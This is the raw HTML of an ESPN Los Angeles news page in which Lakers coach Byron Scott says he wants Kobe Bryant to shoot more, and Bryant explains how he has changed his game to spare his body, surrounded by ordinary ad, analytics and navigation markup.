</ul><script>jQuery.getScriptCache('http://a.espncdn.com/combiner/c/70?js=jquery.sharetools.r15-u4.js', function() {jQuery('#page-actions-top, #page-actions-bottom').sharetools('http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant');});</script></div><!-- end mod-article-title -->
<!-- begin story body -->
<div style="overflow:hidden;"><div class="mod-inline video-player full-box with-playlist next"><div class="videoplayer videoplayer-story09" style="margin-top:0px !important;"><img src="http://a.espncdn.com/media/motion/2015/0101/dm_150101_NBA_Kobe_Minutes/dm_150101_NBA_Kobe_Minutes.jpg" /></div><div id="videoInfo"><h5>Scott: Kobe Minutes 'Experiment' Working</h5><div class="mod-video-tags"><span>ESPNLosAngeles.com's Arash Markazi breaks down how Kobe Bryant is responding to Byron Scott changing his playing time.</span><div class="mod-video-tags"><strong>Tags:</strong> <a href="http://search.espn.go.com/nba/video/6">NBA</a>, <a href="http://search.espn.go.com/kobe-bryant/video/6"> Kobe Bryant</a>, <a href="http://search.espn.go.com/los-angeles-lakers/video/6"> Los Angeles Lakers</a></div></div></div><a id="videotoplay" style="display:none;" class="{trackingName: 'story09', playRelatedExternally: 'false'}" href="http://espn.go.com/video/clip?id=12110258">Scott: Kobe Minutes 'Experiment' Working</a><div class="mod-video-playlist"><h6>NEXT VIDEO <img width="15" height="8" alt="video" src="http://a.espncdn.com/icons/video2.png" /></h6><ul class="bulletlinks"><li class=" first active"><a class="{trackingName: 'story09', playRelatedExternally: 'false'}" href="http://espn.go.com/video/clip?id=12110258">Scott: Kobe Minutes 'Experiment' Working</a><span style="display:none;"><h5>Scott: Kobe Minutes 'Experiment' Working</h5><div class="mod-video-tags"><span>ESPNLosAngeles.com's Arash Markazi breaks down how Kobe Bryant is responding to Byron Scott changing his playing time.</span><div class="mod-video-tags"><strong>Tags:</strong> <a href="http://search.espn.go.com/nba/video/6">NBA</a>, <a href="http://search.espn.go.com/kobe-bryant/video/6"> Kobe Bryant</a>, <a href="http://search.espn.go.com/los-angeles-lakers/video/6"> Los Angeles Lakers</a></div></div></span></li><li class=" next"><a class="{trackingName: 'story09', playRelatedExternally: 'false'}" href="http://espn.go.com/video/clip?id=12114907">Kobe: Euro Players More Skillful</a><span style="display:none;"><h5>Kobe: Euro Players More Skillful</h5><div class="mod-video-tags"><span>ESPNLosAngeles.com's Arash Markazi discusses Kobe Bryant's comments about European basketball players being more skillful than American basketball players because of the coaching at the AAU level, and what can be done to fix it.</span><div class="mod-video-tags"><strong>Tags:</strong> <a href="http://search.espn.go.com/nba/video/6">NBA</a>, <a href="http://search.espn.go.com/kobe-bryant/video/6"> Kobe Bryant</a>, <a href="http://search.espn.go.com/los-angeles-lakers/video/6"> Los Angeles Lakers</a></div></div></span></li><li class=" last"><a class="{trackingName: 'story09', playRelatedExternally: 'false'}" href="http://espn.go.com/video/clip?id=12114361">Lakers Fall Short Against Grizzlies</a><span style="display:none;"><h5>Lakers Fall Short Against Grizzlies</h5><div class="mod-video-tags"><span>Kobe Bryant couldn't get the potential game-tying 3-pointer off as time expired and the Lakers fell to the Grizzlies 109-106. </span><div class="mod-video-tags"><strong>Tags:</strong> <a href="http://search.espn.go.com/nba/video/6">NBA</a>, <a href="http://search.espn.go.com/memphis-grizzlies/video/6"> Memphis Grizzlies</a>, <a href="http://search.espn.go.com/los-angeles-lakers/video/6"> Los Angeles Lakers</a>, <a href="http://search.espn.go.com/kobe-bryant/video/6"> Kobe Bryant</a>, <a href="http://search.espn.go.com/marc-gasol/video/6"> Marc Gasol</a>, <a href="http://search.espn.go.com/mike-conley/video/6"> Mike Conley</a></div></div></span></li></ul></div></div>
		<script>
		var ESPN_GLOBALS = {
			"videoPlayers":{
				"story09":{
					"height":324,
					"width":576,
					"localSite":"losangeles",
					"autostart":"true",
					"trackingName":"story09"
				}
			}
		};

		espn.video.embeded.play();
		</script>
	<p>EL SEGUNDO, Calif. -- Byron Scott is happy <a href="http://espn.go.com/nba/player/_/id/110/kobe-bryant">Kobe Bryant</a> has been averaging close to a triple-double in the three games he has played since returning from a three-game rest last week, but the <a href="http://espn.go.com/nba/team/_/name/lal/los-angeles-lakers">Los Angeles Lakers</a>' coach is hoping his star player will shoot more moving forward.</p>
<p>"It's been interesting," Scott said after practice Saturday. "He's really trying to keep his [shot attempt] numbers down to the 14, 15, 16 area, and I want him up in the 18, 19 area, but I can't argue with the results. He's getting everyone involved. He's rebounding the ball and had 8, 9, 11 assists in the last couple of games. I can't argue with the results and he's still being aggressive as far as looking for his shots but he's still being aggressive as far as looking for his teammates. I would like his shots to be up more up, but I can't argue with the way he's playing."</p>
<p><div class="mod-inline image image-right"><div style="margin-right:10px; width:300px;"><a class="enlarge" href="http://a.espncdn.com/photo/2014/1126/nba_g_bryant_jv_600x400.jpg" credit="Victor Decolongon/Getty Images">[+] Enlarge<img src="http://a.espncdn.com/photo/2014/1126/nba_g_bryant_jv_300x200.jpg" width="300" height="200" alt="Kobe Bryant" border="0" /></a><div style="width: 300px;"><cite>Victor Decolongon/Getty Images</cite>Kobe Bryant is averaging 11.6 shots a game.</div></div></div></p>
<p>Before taking a week off to rest his body, Bryant was averaging over 22 shots per game and was 8 of 30 from the field in Sacramento. In his three games back, Bryant has cut his shot total in half and is now attempting 11.6 shots per game.</p>
<p>Bryant said the time away from the court was not only good for his body but helped him adjust his game as he watched his teammates play from the sideline.</p>
<p>"I had a chance to really evaluate my game and taking more straight line drops and more efficiency of movement," Bryant said. "I don't know if my body can take the workload. In a situation where teams just double me all over the floor, it's not like I'm passing up shots. I don't have them because they stack up and trap. Back in my younger days I could go through that stuff and have 30-40 points, now my body can't take it, so I'll dominate the game in a different way."</p>
<p>Bryant was at the Lakers training facility Saturday but did not practice with the team and was sent home by Scott not long after he arrived. He is expected to start Sunday's game against the <a href="http://espn.go.com/nba/team/_/name/ind/indiana-pacers">Indiana Pacers</a>.</p>
<p>"I had texted him earlier not to come in but by the time he got the text he was already on his way," Scott said. "Once he came here I told him to get something to eat, get back out and we'll see him tomorrow."</p></p><p></p><p>
</p><!--nothing from ssGutsHash for http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant-->

<style>
.vote-module {
    margin: 10px;
}
</style><ul id="page-actions-bottom" class="mod-page-actions"><li class="social facebook-recommend"><a href="https://www.facebook.com/sharer.php?u=http%3A%2f%2fespn.go.com%2flos%2dangeles%2fnba%2fstory%2f_%2fid%2f12115240%2flos%2dangeles%2dlakers%2dcoach%2dwants%2dmore%2dshots%2dkobe%2dbryant&t=Lakers+coach+wants+more+shots+from+Kobe" target="_new" rel="nofollow"><span class="sprite-page-actions facebook"></span><span class="label">Recommend</span></a><a class="count" href="https://www.facebook.com/sharer.php?u=http%3A%2f%2fespn.go.com%2flos%2dangeles%2fnba%2fstory%2f_%2fid%2f12115240%2flos%2dangeles%2dlakers%2dcoach%2dwants%2dmore%2dshots%2dkobe%2dbryant&t=Lakers+coach+wants+more+shots+from+Kobe" target="_new" rel="nofollow">0</a></li>
<li class="social twitter-tweet"><a href="http://twitter.com/intent/tweet?url=http%3A%2f%2fespn.go.com%2flos%2dangeles%2fnba%2fstory%2f_%2fid%2f12115240%2flos%2dangeles%2dlakers%2dcoach%2dwants%2dmore%2dshots%2dkobe%2dbryant&text=Lakers+coach+wants+more+shots+from+Kobe&via=ESPNLosAngeles" target="_new" rel="nofollow"><span class="sprite-page-actions twitter"></span><span class="label">Tweet</span></a><a class="count" href="http://twitter.com/intent/tweet?url=http%3A%2f%2fespn.go.com%2flos%2dangeles%2fnba%2fstory%2f_%2fid%2f12115240%2flos%2dangeles%2dlakers%2dcoach%2dwants%2dmore%2dshots%2dkobe%2dbryant&text=Lakers+coach+wants+more+shots+from+Kobe&via=ESPNLosAngeles" target="_new" rel="nofollow">0</a></li>
<li class="espn-email"><a id="email-12115240" class="email" href="http://sendtofriend.espn.go.com/sendtofriend/SendToFriend?id=12115240" target="_new" rel="nofollow"><span class="sprite-page-actions email"></span><span class="label">Email</span></a></li>
<li class="insider"><a href="http://insider.espn.go.com/insider/promo/offer?addata=insdr_footer_sub" target="_new"><span class="sprite-page-actions" style="background-position: 0 15px"><img alt="Insider" src="http://a.espncdn.com/icons/in_15.png"></span><span class="label">Subscribe</span></a></li>
<li class="print"><a id="print-12115240" class="print" href="http://espn.go.com/espn/print?id=12115240&type=story" rel="nofollow"><span class="sprite-page-actions print"></span><span class="label">Print</span></a></li>
<li class="social fb-comments"><a href="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant#comments" rel="nofollow"><span class="sprite-page-actions comments"></span><span class="label">Comments</span></a><a class="count" href="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant#comments" rel="nofollow">0</a></li></ul><div class="mod-author-bio" style="overflow:visible;"><div class="author"><a href="http://espn.go.com/los-angeles/columns/archive?name=arash-markazi"><img class="floatleft" src="http://a.espncdn.com/combiner/i?img=%2fi%2fcolumnists%2fmarkazi_arash_m.jpg&w=35&h=48"></a><h4><a href="http://espn.go.com/los-angeles/columns/archive?name=arash-markazi">Arash Markazi</a></h4>ESPNLosAngeles.com<ul class="author-actions" style="overflow:visible;"><li style="line-height: 20px;" class="twitter-follow"><a href="http://twitter.com/intent/user?screen_name=ArashMarkazi"><span class="sprite-page-actions-12 twitter" style="margin: 4px 4px 4px 0;"></span>Follow</a></li><li style="line-height: 20px;"><a href="http://espn.go.com/los-angeles/columns/archive?name=arash-markazi">Archive</a></li></ul></div><ul class="bulletlinks"><li>Former columnist and writer after five years with Sports Illustrated<li>Markazi has also written for Slam, King, Vibe and Playboy<li>On board of directors for Jim Murray Memorial Foundation.</ul><div class="clear"></div></div></div>
<!-- end story body -->
</div>
<div class="bg-opaque mod-outbrain mod-no-border">
<div class="mod-content">
<div class="col-full">
<h4 class="first">SPONSORED HEADLINES</h4>
<div class="OUTBRAIN" data-src="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant" data-widget-id="AR_4" data-ob-template="espn" ></div></div>
</div>
</div>
<div class="bg-opaque pad-16 mod-conversations"><div id="comments" class="mod-content" style="padding: 0"><h3 class="mod-header"><span style="font-size:16px">Comments</span><div class="clear"></div></h3><p style="margin: 10px 0 0; font-size: 10px; color: #777;">Use a <a href="https://www.facebook.com/r.php" rel="nofollow">Facebook account</a> to add a comment, subject to Facebook's <a href="https://www.facebook.com/policies/" rel="nofollow">Terms of Service</a> and <a href="https://www.facebook.com/about/privacy/" rel="nofollow">Privacy Policy</a>. Your Facebook name, photo & other personal information you make public on Facebook will appear with your comment, and may be used on ESPN's media platforms. <a href="http://espn.go.com/community/story/_/id/8756098/espn-facebook-comments-faq">Learn more</a>.</p><br /><div class="fb-comments" data-href="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant" data-num-posts="5" data-width="582" ></div></div></div><script type="text/javascript">
	(function($) {
		espn.f8.init();
		$(document).ready(function () {
			(function checkCommentCount() {
				var commentCount = $('.fb-comments .count').first().html(),
					cancel = 0;
				if ((commentCount !== '' && commentCount !== '0') || cancel > 10) {
					if (commentCount == '0' || commentCount == '') {
						$('#comments-on-story').hide();
					} else {
						$('#fb-comment-count').html(commentCount);
					}
					plural = 'comment' + ((commentCount == '1') ? '' : 's');
					$('.comment-text').html(plural);
				} else {
					cancel++;
					setTimeout(checkCommentCount, 200);
				}
			})();
		})
	})(jQuery);
</script></div>
<div id="noContent" style="display:none;"></div><!-- begin column 2 -->
<div class="span-2 last">
<style>.mod-package ul.bulletlinks li { white-space: nowrap; }</style><!-- begin package module -->
<div class="mod-container mod-no-footer mod-package" id="mod_packagemodule">
<div class="mod-header">
<h4>THE NBA ON ESPN.COM</h4>
</div>
<div class="mod-content mod-open">
<div class="gradient-container">
<p><img style="display:block; margin-left:auto; margin-right:auto; float:none;" alt="Westbrook_Rose 150102 [203x114]" src="http://a.espncdn.com/photo/2015/0102/nba_g_westbrook-rose_203x114.jpg"><ul class="bulletlinks" style="padding:5px 0 0 !important;"><li><a href="http://espn.go.com/nba/story/_/page/5-on-5-150102/biggest-leaps-2015">5-on-5: Who will make big leaps in 2015?</a>&nbsp;</li><li><a href="http://espn.go.com/boston/nba/story/_/id/12107144/boston-celtics-eye-bittersweet-reunion-rajon-rondo">MacMullan: Rondo's return stirs mixed feelings </a>&nbsp;</li><li><a href="http://insider.espn.go.com/nba/story/_/id/12111029/cleveland-cavaliers-involve-kevin-love-offensively-nba">Elhassan: Keeping Love in Cleveland</a>&nbsp;<img src="http://a.espncdn.com/icons/in.gif" alt="Insider" /></li><li><a href="http://espn.go.com/blog/golden-state-warriors/post/_/id/157/scream-too-kerr-green-gel-through-yells">Scream, too: Kerr, Green gel through yells</a>&nbsp;</li><li><a href="http://espn.go.com/espn/feature/story/_/id/12103185/nba-new-year-resolutions">New Year's resolutions for NBA players</a>&nbsp;</li><li><a href="http://espn.go.com/nba/theten">The Ten: Top 10 stories from last night</a>&nbsp;</li></ul></div>
</div>
</div>
<!-- end package module -->
<!-- begin InContent -->
<div class="ad-box" id="AdContainer"><!--espn.local.losangeles.com sitezone-->
<script>if("undefined"!=typeof ad_kvps&&"undefined"!=typeof ad_u&&"undefined"!=typeof ad_counter&&"undefined"!=typeof ad_ord){if("undefined"==typeof ad_site||"undefined"==typeof ad_zone)var ad_site="espn.local.losangeles.com",ad_zone="nba";var ad_finalString="http://ad.Doubleclick.net/adj/"+ad_site+"/"+ad_zone+";"+ad_kvps+"pos=InContent;"+ad_u+"dcopt=ist;sz=300x600,300x250,1x1;tile="+ad_counter+";ord="+ad_ord;document.write('<div data-cb-ad-id="InContent" data-cb-dfp-id="'+ad_kvps+'sz=300x600,300x250,1x1"><script src='+ad_finalString+'>\x3c/script></div>');ad_counter++};</script>
<noscript><a href="http://ad.Doubleclick.net/jump/espn.local.losangeles.com/nba;pgtyp=story;sp=nba;tm=lal;pl=110;objid=12115240;col=markazi_arash;sz=300x600,300x250,1x1;" target="_blank"><img src="http://ad.Doubleclick.net/ad/espn.local.losangeles.com/nba;pgtyp=story;sp=nba;tm=lal;pl=110;objid=12115240;col=markazi_arash;sz=300x600,300x250,1x1;" border="0" alt=""></a></noscript>
</div><!-- end InContent -->

			<div class="mod-container mod-no-footer mod-open">
			<div class="mod-header">
			<h4>LOS ANGELES TOP STORIES</h4>
			</div>
			<div class="mod-content">
			<div class="gradient-container">
			<div class="col-full">
			<ul class="bulletlinks">
		    <li><a  href="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant" name="&lpos=hn1&lid=Lakers' Scott wants">Lakers' Scott wants Kobe to shoot ball more</a> <img src="http://assets.espn.go.com/icons/watch_headlines.png" width="17" height="8" border="0" alt="Video" /></li>
<li><a  href="http://espn.go.com/los-angeles/nba/story/_/id/12114523/kobe-bryant-says-european-players-more-skilled-americans-blames-aau" name="&lpos=hn2&lid=Kobe rips AAU: Euro">Kobe rips AAU: Europe players more skillful</a> <img src="http://assets.espn.go.com/icons/watch_headlines.png" width="17" height="8" border="0" alt="Video" /></li>
<li><a  href="http://espn.go.com/los-angeles/college-football/story/_/id/12115232/nelson-agholor-leaving-usc-enter-nfl-draft" name="&lpos=hn3&lid=WR Agholor leaving">WR Agholor leaving USC to enter NFL draft</a></li>
<li><a  href="http://www.espnfc.us/barclays-premier-league/story/2226548/steven-gerrard-to-join-la-galaxy-on-18-month-contractsource-says" name="&lpos=hn4&lid=Source: Liverpool's">Source: Liverpool's Gerrard to join Galaxy</a> <img src="http://assets.espn.go.com/icons/watch_headlines.png" width="17" height="8" border="0" alt="Video" /></li>
<li><a  href="http://espn.go.com/los-angeles/nhl/recap?gameId=400564710" name="&lpos=hn5&lid=Kings fall in OT af">Kings fall in OT after furious 3rd-period rally</a> <img src="http://assets.espn.go.com/icons/watch_headlines.png" width="17" height="8" border="0" alt="Video" /></li>
<li><a  href="http://espn.go.com/blog/los-angeles/lakers/post/_/id/40793/kobes-coldest-clutch-shooting-streak" name="&lpos=hn6&lid=Kobe ice cold in th">Kobe ice cold in the clutch</a> <img src="http://assets.espn.go.com/icons/watch_headlines.png" width="17" height="8" border="0" alt="Video" /> | <a href="http://espn.go.com/los-angeles/nba/story/_/id/12108146/lebron-james-cleveland-cavaliers-stephen-curry-golden-state-warriors-lead-nba-all-star-voting" name="&lpos=hn6sub&lid=All-Star voting">All-Star voting</a></li>
<li><a  href="http://sports.espn.go.com/los-angeles/nhl/recap?gameId=400564283" name="&lpos=hn7&lid=Jagr, 43 next month">Jagr, 43 next month, oldest to notch hat trick</a> <img src="http://assets.espn.go.com/icons/watch_headlines.png" width="17" height="8" border="0" alt="Video" /></li>
<li><a  href="http://espn.go.com/los-angeles/college-football/story/_/id/12115634/college-football-playoff-national-championship-city-oregon-change-name-support-ohio-state-buckeyes" name="&lpos=hn8&lid=Ohio city Oregon to">Ohio city Oregon to change name for finale</a> <img src="http://assets.espn.go.com/icons/watch_headlines.png" width="17" height="8" border="0" alt="Video" /></li>
<li><a  href="http://insider.espn.go.com/blog/craig-custance/post?id=4620" name="&lpos=hn9&lid=Custance: Comeback">Custance: Comeback W masks Kings concerns</a> <img src="http://a.espncdn.com/icons/in.gif" alt="Insider" /></li>
</ul>
</div></div></div></div><!-- sportIndex: espn --><!-- root: espn -->
                                <style type="text/css">
                                    .mod-fanshop .mod-content ul li dl {clear:both;}
                                    .mod-fanshop .mod-content ul li dd {float:left;width:100px;text-align:center;margin-top:5px;}
                                    .mod-fanshop .mod-content ul li dt {float:left;width:160px;margin-top:10px;}
                                </style>
                                <div class="mod-container mod-no-footer mod-fanshop"><div class="mod-header"><h4>ESPN FAN SHOP <span style="position: relative; top: 4px; margin-right: 5px;"><a href="http://www.dickssportinggoods.com/category/index.jsp?categoryId=11400507&camp=Part:ESPNpart::storyfeed:ESPN" rel="nofollow" target="_blank"><img src="http://a.espncdn.com/i/shop/dsg_presby.gif"/></a></span></h4></div><div class="mod-content"><ul><li><dl><dd><a href="http://www.dickssportinggoods.com/product/index.jsp?productId=16673526&camp=Part:ESPNpart::storyfeed:ESPN" rel="nofollow" target="_blank"><img width="80" src="http://www.dickssportinggoods.com/graphics/product_images/pDSP1-14411296nm.jpg"/></a></dd><dt>Adidas Men's L.a. Lakers Kobe Bryant #24 Road Purple Replica Jersey<br />Price: <a rel="nofollow" href="http://www.dickssportinggoods.com/product/index.jsp?productId=16673526&camp=Part:ESPNpart::storyfeed:ESPN">$70.00</a></br> <a href="http://www.dickssportinggoods.com/product/index.jsp?productId=16673526&camp=Part:ESPNpart::storyfeed:ESPN" rel="nofollow" target="_blank"><b><nobr>Shop &#187;</nobr></b></a></dt></dl></li></ul></div></div><!-- begin More NBA Headlines-->
<div class="mod-container mod-no-footer mod-open" id="mod_story_mh">
<div class="mod-header">
<h4>MORE NBA HEADLINES</h4>
</div>
<div class="mod-content">
<div class="gradient-container">
<div class="col-full" style="padding:3px">
<ul class="bulletlinks">
<li><a href="http://scores.espn.go.com/nba/recap?gameId=400578793" name="&amp;lpos=story_mh&amp;lid=Millsap, Hawks hand">Millsap, Hawks hand Blazers rare home loss</a></li>
<li><a href="http://scores.espn.go.com/nba/recap?gameId=400578791" name="&amp;lpos=story_mh&amp;lid=Spurs extend reign">Spurs extend reign over Wiz to 17 straight</a></li>
<li><a href="http://scores.espn.go.com/nba/recap?gameId=400578789" name="&amp;lpos=story_mh&amp;lid=Rockets rout Heat b">Rockets rout Heat behind Harden, Howard</a></li>
<li><a href="http://scores.espn.go.com/nba/recap?gameId=400578787" name="&amp;lpos=story_mh&amp;lid=Walker's 30 help Ho">Walker's 30 help Hornets halt 5-game skid</a></li>
<li><a href="http://scores.espn.go.com/nba/recap?gameId=400578788" name="&amp;lpos=story_mh&amp;lid=Gasol's huge night">Gasol's huge night leads Bulls over C's in OT</a></li>
</ul>
</div>
</div>
</div>
</div>
<!-- end More NBA Headlines-->
<div class="mod-container mod-fb-activity-plugin mod-open mod-no-footer" id="mod_recent_activity" style="display:none;"><div class="mod-header"><h4>RECENT ACTIVITY</h4></div><div class="mod-content" style="padding:0px; border:0 none; overflow: hidden;"></div></div><!-- begin splinks -->
<div id="sponsored" class="mod-container mod-no-footer">
<!-- CONTENT: 09story304, SPORT: local--><div style="margin:0px 0px 5px 0px; text-align: center; width: 304px;"><ins id="splinks-91912"></ins>
        <script type="text/javascript">
            (function($) {
                // config params
                var width = '304',
                    height = '320',
                    client = 'ca-espn-q-story',
                    channel = 'local right',
                    lang = 'null';

                // builds iframe HTML
                function buildIframe(width, height, client, channel) {
                    var path = 'http://sports-ak.espn.go.com/espn/sponsoredlinks/adsense/iframeCached';
                    // pass params as the hash as they are only needed on the client
                    var hash = '91912|' + width + '|' + height + '|' + client + '|' + channel + '|' + lang;
                    var iframe = '<iframe seamless scrolling="no" frameborder="0" height="' + height + '" width="' + width + '" src="' + path + '#' + hash + '"></iframe>';
                    return iframe;
                }

                // handles messages from child iframe
                function handleMessage(event) {
                    if (event.origin === 'http://sports-ak.espn.go.com') {
                        $('#splinks-' + event.data).html('<!-- no ads served -->');
                    }
                }

                if (typeof window.addEventListener === 'function') {
                    window.addEventListener('message', handleMessage, false);
                } else {
                    window.attachEvent('onmessage', handleMessage);
                }

                // insert the iframe
                if (espn.geo) {
                    espn.geo.getLocation().done(function(loc) {
                        if (loc.country.isoCode !== 'usa' || espn.core.mobileApple || espn.core.android) {
                            // outside US or not on desktop
                            client = 'ca-espn-nq';
                        }
                        $('#splinks-91912').html(buildIframe(width, height, client, channel));
                    }).fail(function() {
                        $('#splinks-91912').html(buildIframe(width, height, 'ca-espn-nq', channel));
                    });
                } else {
                    // can't locate them, assume they are outside US
                    $('#splinks-91912').html(buildIframe(width, height, 'ca-espn-nq', channel));
                }
            })(jQuery);
        </script>
    </div></div>
<!-- end splinks -->
</div>
<!--end column 2 -->

    <!--BEGIN QUALTRICS SITE INTERCEPT-->
    <script type='text/javascript'>
    (function(){var g=function(e,h,f,g){
    this.get=function(a){for(var a=a+"=",c=document.cookie.split(";"),b=0,e=c.length;b<e;b++){for(var d=c[b];" "==d.charAt(0);)d=d.substring(1,d.length);if(0==d.indexOf(a))return d.substring(a.length,d.length)}return null};
    this.set=function(a,c){var b="",b=new Date;b.setTime(b.getTime()+6048E5);b="; expires="+b.toGMTString();document.cookie=a+"="+c+b+"; path=/; "};
    this.check=function(){var a=this.get(f);if(a)a=a.split(":");else if(100!=e)"v"==h&&(e=Math.random()>=e/100?0:100),a=[h,e,0],this.set(f,a.join(":"));else return!0;var c=a[1];if(100==c)return!0;switch(a[0]){case "v":return!1;case "r":return c=a[2]%Math.floor(100/c),a[2]++,this.set(f,a.join(":")),!c}return!0};
    this.go=function(){if(this.check()){var a=document.createElement("script");a.type="text/javascript";a.src=g+ "&t=" + (new Date()).getTime();document.body&&document.body.appendChild(a)}};
    this.start=function(){var a=this;window.addEventListener?window.addEventListener("load",function(){a.go()},!1):window.attachEvent&&window.attachEvent("onload",function(){a.go()})}};
    try{(new g(100,"r","QSI_S_SI_bdTeqjfAPFDimCp","//zn_4slwdofs4ykbmhc-espn.siteintercept.qualtrics.com/WRSiteInterceptEngine/?Q_SIID=SI_bdTeqjfAPFDimCp&Q_LOC="+encodeURIComponent(window.location.href))).start()}catch(i){}})();
    </script><div id='SI_bdTeqjfAPFDimCp'><!--DO NOT REMOVE-CONTENTS PLACED HERE--></div>
    <!--END SITE INTERCEPT-->
    <script type="text/javascript">
var axel = Math.random() + "";
var a = axel * 10000000000000;
document.write('<iframe src="http://fls.doubleclick.net/activityi;src=1181183;type=espnc270;cat=espnl654;ord=1;num='+ a + '?" width="1" height="1" frameborder="0" style="display: none"></iframe>');
</script>
<noscript>
<iframe src="http://fls.doubleclick.net/activityi;src=1181183;type=espnc270;cat=espnl654;ord=1;num=1?" width="1" height="1" frameborder="0"></iframe>
</noscript>
</div>
<div id="nav-wrapper" class="container">
<div id="nav-wrapper-container">
<div id="nav-main">
<!-- begin site nav -->
<ul class="top" id="nav-main-list" style="letter-spacing: -.1px">
<!-- begin site nav -->
<li id="menu-teamlakers"  class="nav-main-top-menu-item t-lakers"><a name="&lpos=losangelesmeganav&lid=navtitle" href="http://espn.go.com/blog/los-angeles/lakers/">LAKERS</a></li><li id="menu-teamclippers"  class="nav-main-top-menu-item t-clippers"><a name="&lpos=losangelesmeganav&lid=navtitle" href="http://espn.go.com/blog/los-angeles/clippers/">CLIPPERS</a></li><li id="menu-teamdodgers"  class="nav-main-top-menu-item t-dodgers"><a name="&lpos=losangelesmeganav&lid=navtitle" href="http://espn.go.com/blog/los-angeles/dodger-report/">DODGERS</a></li><li id="menu-teamangels"  class="nav-main-top-menu-item t-angels"><a name="&lpos=losangelesmeganav&lid=navtitle" href="http://espn.go.com/blog/los-angeles/angels/">ANGELS</a></li><li id="menu-teamusc"  class="nav-main-top-menu-item t-usc"><a name="&lpos=losangelesmeganav&lid=navtitle" href="http://espn.go.com/blog/los-angeles/usc/">USC</a></li><li id="menu-teamucla"  class="nav-main-top-menu-item t-ucla"><a name="&lpos=losangelesmeganav&lid=navtitle" href="http://espn.go.com/blog/los-angeles/ucla/">UCLA</a></li><li id="menu-teamkings"  class="nav-main-top-menu-item t-kings"><a name="&lpos=losangelesmeganav&lid=navtitle" href="http://espn.go.com/blog/los-angeles/kings/">KINGS</a></li><li id="menu-teamducks"  class="nav-main-top-menu-item t-ducks"><a name="&lpos=losangelesmeganav&lid=navtitle" href="http://espn.go.com/blog/los-angeles/anaheim-ducks/">DUCKS</a></li><li id="menu-more"  class="nav-main-top-menu-item t-more"><a name="&lpos=losangelesmeganav&lid=navtitle" href="http://espn.go.com/losangeles/teams">MORE</a></li><li id="menu-radio"  class="right-menu two-line nav-main-top-menu-item t-radio"><a name="&lpos=losangelesmeganav&lid=navtitle" href="http://espn.go.com/los-angeles/radio">ESPN 710<span>RADIO</span></a></li><!-- start: Menuitem :: FANTASY & GAMES --><li id="menu-fantasy" class="right-menu two-line t-fantasy nav-main-top-menu-item"><a href="http://games.espn.go.com/frontpage" name="&amp;lpos=espnlosangelesmega&amp;lid=sitenav_fantasy">FANTASY<span>& GAMES</span></a></li><!-- end site nav -->
</ul>
<!-- end site nav -->
</div>
<div class="nav-main-secondary">
<!-- subNavId = null --><!--url:/losangeles/nba/story--></div>
</div>
</div>
<!-- glance=falseindexPubKey=losangelesindex sportRoot=losangeles root=losangelespageType=story --></div>
<!-- end content -->
</div>
<!-- end subheader -->

<script>
espn.core.init.nav();
</script>
<!-- begin footer -->
<div id="footer" class="container">
<script type="text/javascript">
//<![CDATA[
var link = window.location;
var bugText = '<a href="#" onclick="window.open(\'http://dynamic.espn.go.com/espn/bugs?url=' + escape(link) + '\', \'Bugs\',\'noresizable,noscrollbars,height=400,width=400\');">Report a Bug</a> | ';
//]]>
</script>
<span style="font-weight:bold;">ESPN.com:</span> <a href="http://sports.espn.go.com/espn/news/story?page=help/index">Help</a> | <a href="http://espnmediazone.com/us/" rel="nofollow">Press</a> | <a href="http://www.espncms.com/Advertise-on-ESPN.aspx" rel="nofollow">Advertise on ESPN.com</a> | <a href="http://www.espncms.com" rel="nofollow">Sales Media Kit</a> | <a href="http://preferences.truste.com/2.0/?type=espn&affiliateId=148" onclick="window.open('http://preferences.truste.com/2.0/?type=espn&affiliateId=148','popup','width=986,height=878,scrollbars=yes,resizable=no,toolbar=no,directories=no,location=no,menubar=no,status=no,left=0,top=0'); return false">Interest-Based Ads</a> | <script type="text/javascript">document.write(bugText);</script><a href="http://espn.go.com/espn/corrections">Corrections</a> | <a href="http://sports.espn.go.com/espn/news/story?page=contact/index">Contact Us</a> | <a href="http://espn.go.com/espn/sitemap">Site Map</a> | <a href="http://espncareers.com">Jobs at ESPN</a> | <!--a href="http://corporate.disney.go.com/corporate/sourcing.html" rel="nofollow"><span style="font-weight:bold;">Supplier Information</span></a--><a href="http://go.com">Go.com</a><br/>&copy; 2015  ESPN Internet Ventures. <a href="http://disneytermsofuse.com/" rel="nofollow">Terms of Use</a>, <a href="http://disneyprivacycenter.com/" rel="nofollow">Privacy Policy</a>, <a href="https://disneyprivacycenter.com/notice-to-california-residents/" rel="nofollow">Your California Privacy Rights</a>,  <a href="https://disneyprivacycenter.com/kids-privacy-policy/english/">Children's Online Privacy Policy</a> and <a href="http://preferences-mgr.truste.com/?type=espn&affiliateId=148">Interest-Based Ads</a> are applicable to you.  All rights reserved.

<!--
<a href="http://www.espnshop.com/" onClick="location.href('http://log.go.com/log?srvc=sz&guid=73B641A0-6660-4EFC-B8FF-9DE23E8CD9BD&drop=0&addata=3374:65:478847:65&a=1&goto=http://www.espnshop.com/');return false">Shop</a>
--></div>
<!-- end footer -->
<!--[if lte IE 9]></div><![endif]-->
</div>
<!-- end bg-elements -->


<!-- SiteCatalyst code version: H.21.3 Copyright 1997-2010 Omniture, Inc. http://www.omniture.com -->
<script type="text/javascript">
	var undef = 'undefined'
	,s_account="wdgesplosangeles"
	,omniPageName = "espnlosangeles:los-angeles:nba:story:storyid=12115240-150103+lakers+coach+wants+more+shots+from+kobe"
	
	,insiderStatus = ""
	,anGen = ""
	,anYear = ""
	,anDateString = ""
	,anLoginStatus = ""
	,callOmniture = function(){
		/*-- core story s_omni properties --*/
		if (typeof anCV != "undefined"){anParseLoginBarInfo(anCV);}
		s_omni.pageName="los-angeles:nba:story:storyid=12115240-150103+lakers+coach+wants+more+shots+from+kobe";
		s_omni.server = window.location.host; // Server from the Host
		s_omni.channel = "los-angeles";
